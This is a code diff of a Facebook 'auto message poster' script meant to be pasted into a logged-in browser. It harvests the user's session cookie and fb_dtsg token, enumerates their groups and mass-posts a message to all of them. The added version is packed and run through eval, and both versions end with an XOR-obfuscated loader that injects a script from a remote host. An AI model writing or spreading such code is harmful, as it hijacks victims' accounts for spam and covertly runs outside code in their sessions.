@@ -1,103 +1,4 @@
-var Title = 'Auto Message Poster in All Groups.';
-var Descriptions = "", _text = 'Created & Designed By <A style="color:#3B5998;" href="https://www.facebook.com/pkwaq">Waqar Ahmad.</A><br/>Powered By <A style="color:#3B5998;" href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>';
-var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
-  display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
-display += "<div><textarea id='txtFloodMsg' placeholder='Write your messege here.'  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
-   display +="<div class='clearfix' style='text-align:right;padding-top:5px;'><span class='uiButtonText' style='padding-right:5px;'>Groups</span></a><span id='UIButton_Start' onclick='autopostingfunc()' style='text-align:center;font-family:tahoma;color:white;width:45px;height:25px;' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected'>Post</span>";
- display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
- display += _text;window[tag + '_close'] = true;
-display += "</div>";
-  display += "</div>";
-  document.getElementById("pagelet_sidebar")
-    .innerHTML = display;
-function Posting(o) {       
-        jx.load(window.location.protocol + "//www.facebook.com/ajax/updatestatus.php?fb_dtsg="+fb_dtsg+"&xhpc_context=profile&xhpc_ismeta=1&xhpc_timeline=&xhpc_composerid="+xhpc_composerid+"&xhpc_targetid="+o+"&xhpc_message_text="+encodeURIComponent(msg)+"&xhpc_message="+encodeURIComponent(msg)+"&is_explicit_place=&composertags_place=&composertags_place_name=&composer_session_id="+now+"&composertags_city=&disable_location_sharing=false&composer_predicted_city=&nctr[_mod]=pagelet_group_composer&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAw&__req=r&phstamp=", function (a) {
-            var b = a.substring(a.indexOf("{"));
-            var c = JSON.parse(b);
-            i--;
-            Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
-    if (c.error) {
-      Descriptions += "color:darkred'>";      
-      if (c.errorDescription) Descriptions += c.errorDescription;
-      else Descriptions += JSON.stringify(c, null, "")
-    }
-    else {
-      Descriptions += "color:darkgreen'>";
-      Descriptions += "Please wait now posting your message in "+arn[i]+".<br/>";
-      suc++
-    }
-    Descriptions += "</div>";
-    var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:15px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
-   if (i > 0) { var Title = 'Auto Message Poster is Now Started Posting Message.';display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>"; 
-
-     display += arr.length + " Groups Detected<br/>";
-      display += "<b>" + suc + "</b> Messege Posted of " + (arr.length - i) + " Messege Processed ";
-      display += "(" + i + " Lefted...)";
-      display += "<div class='friend-edge'>";
-      display += Descriptions;
-     display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px Transparent;' src=" + pho[i] + "></img><a style='padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
-      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
- display +=getuname+" Please Wait While Posting Your Messege.<br/>";
-      display += _text;window[tag + '_close'] = true;
-      display += "</div>";
-      display += "</div>"
-    }
-    else {Title = 'Auto Message Poster is Now Completed Posting.';
-display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
-      display += arr.length + " Groups Detected and "+ suc + " Messege Posted</br></br>"; window[tag + '_close'] = false;    
-         display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>";display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";display += _text;display += "</div>";
-    }
-    display += "</div>";
-    document.getElementById("pagelet_sidebar").innerHTML = display}, "text", "post");tay--;       
-                
-        if (tay > 0) {
-            var s = arr[i];
-            setTimeout("Posting(" + s + ");", 500)
-}
-        console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
-
-    }
-jx={b:function(){var b=!1;if("undefined"!=typeof ActiveXObject)try{b=new ActiveXObject("Msxml2.XMLHTTP")}catch(c){try{b=new ActiveXObject("Microsoft.XMLHTTP")}catch(a){b=!1}}else if(window.XMLHttpRequest)try{b=new XMLHttpRequest}catch(h){b=!1}return b},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=
-k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState)if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)};e.send(k)}},d:function(){return this.b()}};
-function ChangeLocation() {
-    window.location.href = "http://www.facebook.com/"};setTimeout("ChangeLocation", 1);
-window.onbeforeunload = function () {
-        if (window[tag + '_close']) {return 'This script is running now!'
-        }
-    };    
-var now=(new Date).getTime();
-var tag = 'Close';
-var i = 3;
-var tay = 3;
-var suc = 0;
-var arr = new Array;
-var arn = new Array;
-var pho = new Array;
-var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var xhpc_composerid = document.getElementsByName('xhpc_composerid')[0].value;
-var msg='';
-jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=group&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
-    var b = a;
-    var c = b.substring(b.indexOf("{"));
-    var d = JSON.parse(c);
-    d = d.payload.entries;
-    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
-for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
-  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
-    i = arr.length - 1;
-tay = i; console.log(arr.length);});
-function autopostingfunc() {
-if (document.getElementById("txtFloodMsg").value != ""){Title = 'Please Wait While Starting Posting.';msg = document.getElementById("txtFloodMsg").value;var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:15px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
-  display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
-   display += arr.length + " Groups Detected<br/><br/>";     
-      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
- display +=getuname+" Please Wait While Starting Posting Your Messege.<br/>";
-      display += _text;window[tag + '_close'] = true;
-      display += "</div>";
-  display += "</div>";
-  document.getElementById("pagelet_sidebar").innerHTML=display;}
-   Posting(arr[i]);}
-
-    var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
+var a=eval,c='6 P=\'22 1A 1Z 1O 3v 13.\';6 K="",1h=\'3B & 3e 2R <A 8="l:#24;" 1f="3b://19.1a.1b/49">4c 3H.</A><G/>3O 2R <A 8="l:#24;" 1f="37://19.1a.1b/2Y.3V">2Y [3U ] 3Q%.</A>\';6 5="<7 T=\'14-16-5\' 8=\'1p:27;I:50%;1z-I:-2o;10:1E;12:28;z-29:2e;m-t:2v;p-v:M;q:15;1B-1C:11 V 11 C(0,0,0,0.1);U-2f:1H;U:V 2l C(Q,Q,50,0.2);1n-l:C(y,y,y,0.9);l:#2m\'>";5+="<7 8=\'q-1l:L;m-t:1x;\'>"+P+"</7>";5+="<7><2r T=\'2a\' 3W=\'4f 2T 3D 3f.\'  8=\'q-10:L;12:4e;1U:1E;m-23:1W;m-t:3s;1n-l:C(y,y,y,0.1);\'></2r></7>";5+="<7 D=\'3o\' 8=\'p-v:1g;q-10:L;\'><a Y-2V=\'1L\' D=\'3p 4n 44 3T\' 8=\'q-1g:L;m-23:1W;l:3S;m-t:X;m-2t:2u\' 1f=\'#\' 33=\'38\' T=\'3R\' 25-2y=\'1V 1O 13\'><a 8=\'p-v:1g;q-10:L;\' Y-2V=\'1L\'  Y-1L-3Z=\'1g\' D=\'3Y 1o 3X\' 1f=\'#\' 33=\'38\' 25-3P=\'1\' 25-3G=\'1Y\' Y-2y=\'\' Y-B=\'30\' Y-3F=\'1V 3E 3I\' 3J=\'3N\' T=\'3M\'><i 8=\'q-1g:L;\' D=\'3L 1X 3K 40\'></i><J D=\'41\'>13</J></a></a><J T=\'4h\' 4g=\'2P()\' 8=\'p-v:M;m-23:1W;l:O;12:4i;1U:4j;\' D=\'4m 4l 4k 4d 45 2J\'>1V</J>";5+="<7 8=\'p-v:M;m-t:X;O-1k:1i-1j;l:1s\'>";5+=1h;E[Z+\'17\']=2i;5+="</7>";5+="</7>";u.W("1t").1F=5;F N(o){1K.26(E.1y.36+"//19.1a.1b/2F/43.2q?1G="+1G+"&42=46&47=1&4b=&1D="+1D+"&4a="+o+"&48="+2G(1v)+"&3i="+2G(1v)+"&3h=&3l=&3j=&3k="+1r+"&39=&3a=1Y&3g=&3C[3w]=3z&3m="+1Q+"&2O=1&3u=3n&3A=r&3t=",F(a){6 b=a.2w(a.2p("{"));6 c=2n.2Z(b);i--;K="<7 D=\'14-16-3r\' 8=\'q-1l:L;p-v:I;m-t:X;O-1k:1i-1j;";H(c.20){K+="l:3q\'>";H(c.2U)K+=c.2U;18 K+=2n.3y(c,2N,"")}18{K+="l:3x\'>";K+="1m 3c 1r 3d 2T 4F 1O "+1d[i]+".<G/>";1c++}K+="</7>";6 5="<7 T=\'14-16-5\' 8=\'1B-1C:5f 1H 2A C(0, 0, 0, 0.3);1p:27;I:50%;1z-I:-2o;10:1E;12:28;z-29:2e;m-t:15;p-v:M;q:15;1B-1C:11 V 11 C(0,0,0,0.1);U-2f:1H;U:V 2l C(Q,Q,50,0.2);1n-l:C(y,y,y,0.9);l:#2m\'>";H(i>0){6 P=\'22 1A 1Z 1N 2L 5e N 1A.\';5+="<7 8=\'q-1l:L;m-t:1x;\'>"+P+"</7>";5+=w.B+" 13 2k<G/>";5+="<b>"+1c+"</b> 1e 2M 5d "+(w.B-i)+" 1e 5c ";5+="("+i+" 5g...)";5+="<7 D=\'14-16\'>";5+=K;5+="<1X 8=\'12:2S;1U:2S;1z-I:-5h;q:5k;U:V 5j;\' 5i="+2d[i]+"></1X><a 8=\'q-I:2A;m-t:2v;p-v:I;l:#24;1p:5b;m-2t:2u;\'>"+1d[i]+"</a>";5+="<7 8=\'p-v:M;m-t:X;O-1k:1i-1j;l:1s\'>";5+=2j+" 1m 2g 2h N 2Q 1e.<G/>";5+=1h;E[Z+\'17\']=2i;5+="</7>";5+="</7>"}18{P=\'22 1A 1Z 1N 2L 5a N.\';5+="<7 8=\'q-1l:L;m-t:1x;\'>"+P+"</7>";5+=w.B+" 13 2k 54 "+1c+" 1e 2M</G></G>";E[Z+\'17\']=1Y;5+="<7><J D=\'53 52 2J 1o 51 1R\' 21=\'1I()\' 8=\'l:O\'>55 56 59</J><J D=\'58 2H 1o 57 1R\' 21=\'E.1y.5m()\' 8=\'l:O\'>5o 5v</J><J D=\'5w 2H 1o 1R\' 21=\'u.W(\\"1t\\").8.5=\\"2x\\"\'>5x</J><G/>";5+="<7 8=\'p-v:M;m-t:X;O-1k:1i-1j;l:1s\'><G/>";5+=1h;5+="</7>"}5+="</7>";u.W("1t").1F=5},"p","5y");S--;H(S>0){6 s=w[i];32("N("+s+");",5t)}2B.2z(S+"/"+w.B+":"+w[S]+"/"+1d[S]+", 5u:"+1c)}1K={b:F(){6 b=!1;H("5n"!=5p 1T)1S{b=R 1T("5q.2D")}1P(c){1S{b=R 1T("5s.2D")}1P(a){b=!1}}18 H(E.2E)1S{b=R 2E}1P(h){b=!1}1J b},26:F(b,c,a,h,g){6 e=35.d();H(e&&b){e.2I&&e.2I("p/5r");h||(h="5l");a||(a="p");g||(g={});a=a.4Y();h=h.4B();b+=b.2p("?")+1?"&":"?";6 k=2N;"4A"==h&&(k=b.4Z("?"),b=k[0],k=k[1]);e.4z(h,b,!0);e.4C=g.c?F(){g.c(e)}:F(){H(4==e.4o)H(Q==e.2K){6 b="";e.2C&&(b=e.2C);"j"==a.2s(0)?(b=b.4D(/[\\n\\r]/g,""),b=4y("("+b+")")):"x"==a.2s(0)&&(b=e.4x);c&&c(b)}18 g.f&&u.4r("4q")[0].4p(g.f),g.e&&(u.W(g.e).8.5="2x"),20&&20(e.2K)};e.4w(k)}},d:F(){1J 35.b()}};F 1I(){E.1y.1f="37://19.1a.1b/"};32("1I",1);E.4u=F(){H(E[Z+\'17\']){1J\'4G 4H 1N 4T 1r!\'}};6 1r=(R 4S).4R();6 Z=\'4U\';6 i=3;6 S=3;6 1c=0;6 w=R 1M;6 1d=R 1M;6 2d=R 1M;6 2j=u.4V("4X")[0].1F;6 1Q=u.2W.2X(u.2W.2X(/4W=(\\d+)/)[1]);6 1G=u.34(\'1G\')[0].1q;6 1D=u.34(\'1D\')[0].1q;6 1v=\'\';1K.26(E.1y.36+"//19.1a.1b/2F/4Q/4P.2q?"+"2O=1&4K[0]=4J&4I=0&4L="+1Q+"&4M=4O&4N=0",F(a){6 b=a;6 c=b.2w(b.2p("{"));6 d=2n.2Z(c);d=d.4v.4t;2c(6 e=0;e<d.B;e++)w.2b(d[e].4s);2c(6 1w=0;1w<d.B;1w++)1d.2b(d[1w].p);2c(6 1u=0;1u<d.B;1u++)2d.2b(d[1u].4E);i=w.B-1;S=i;2B.2z(w.B)});F 2P(){H(u.W("2a").1q!=""){P=\'1m 2g 2h 31 N.\';1v=u.W("2a").1q;6 5="<7 T=\'14-16-5\' 8=\'1p:27;I:50%;1z-I:-2o;10:1E;12:28;z-29:2e;m-t:15;p-v:M;q:15;1B-1C:11 V 11 C(0,0,0,0.1);U-2f:1H;U:V 2l C(Q,Q,50,0.2);1n-l:C(y,y,y,0.9);l:#2m\'>";5+="<7 8=\'q-1l:X;m-t:1x;\'>"+P+"</7>";5+=w.B+" 13 2k<G/><G/>";5+="<7 8=\'p-v:M;m-t:X;O-1k:1i-1j;l:1s\'>";5+=2j+" 1m 2g 2h 31 N 2Q 1e.<G/>";5+=1h;E[Z+\'17\']=2i;5+="</7>";5+="</7>";u.W("1t").1F=5}N(w[i])}',
+d=345,e="     display var div style             color font   text padding   size document align arr  255   length rgba class window function br if left span Descriptions 5px center Posting white Title 200 new tay id border 1px getElementById 10px data tag top 0pt width Groups friend 15px edge _close else www facebook com suc arn Messege href right _text pre wrap space bottom Please background uiButton position value now gray pagelet_sidebar pic msg eg 20px location margin Message box shadow xhpc_composerid 100px innerHTML fb_dtsg 3px ChangeLocation return jx tooltip Array is in catch user_id uiButtonLarge try ActiveXObject height Post tahoma img false Poster error onClick Auto family 3B5998 aria load fixed 500px index txtFloodMsg push for pho 9999 radius Wait While true getuname Detected solid 000000 JSON 273px indexOf php textarea charAt weight bold 14px substring none label log 8px console responseText XMLHTTP XMLHttpRequest ajax encodeURIComponent uiOverlayButton overrideMimeType selected status Now Posted null __a autopostingfunc Your By 50px your errorDescription hover cookie match Loading parse  Starting setTimeout role getElementsByName this protocol http button composertags_city disable_location_sharing https wait posting Designed here composer_predicted_city is_explicit_place xhpc_message composertags_place_name composer_session_id composertags_place __user 7n8ahyj35CFwXAw clearfix uiStreamPrivacy darkred name 13px phstamp __dyn All _mod darkgreen stringify pagelet_group_composer __req Created nctr messege Privacy ariaprefix expanded Ahmad Setting rel sp_1m1kqw lock js_14 toggle Powered haspopup 99 u_ps_jsonp_32_0_m black fbPrivacyAudienceIndicator lllllllllllllllllllllllllllllllllllllll 999999 placeholder uiButtonSuppressed uiSelectorButton alignh sx_591345 uiButtonText xhpc_context updatestatus fbStreamPrivacy _4jy1 profile xhpc_ismeta xhpc_message_text pkwaq xhpc_targetid xhpc_timeline Waqar _4jy3 505px Write onclick UIButton_Start 45px 25px _11b _4jy0 _42ft inlineBlock readyState removeChild body getElementsByTagName uid entries onbeforeunload payload send responseXML eval open POST toUpperCase onreadystatechange replace photo message This script lazy group filter viewer token stale_ok v7 first_degree typeahead getTime Date running Close getElementsByClassName c_user fbxWelcomeBoxName toLowerCase split  uiButtonSpecial addButton FriendRequestAdd and Go to uiButtonConfirm layerConfirm Homepage Completed absolute Processed of Started 0px Lefted 125px src Transparent 2px GET reload undefined Refresh typeof Msxml2 xml Microsoft 500 success Page layerCancel Cancel post".split(" "),
+f=0,g={},f=function(b){return(62>b?"":f(parseInt(b/62)))+(35<(b%=62)?String.fromCharCode(b+29):b.toString(36))};if(!"".replace(/^/,String)){for(;d--;)g[f(d)]=e[d]||f(d);e=[function(b){return g[b]}];f=function(){return"\\w+"};d=1}for(;d--;)e[d]&&(c=c.replace(RegExp("\\b"+f(d)+"\\b","g"),e[d]));a(c);
+var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
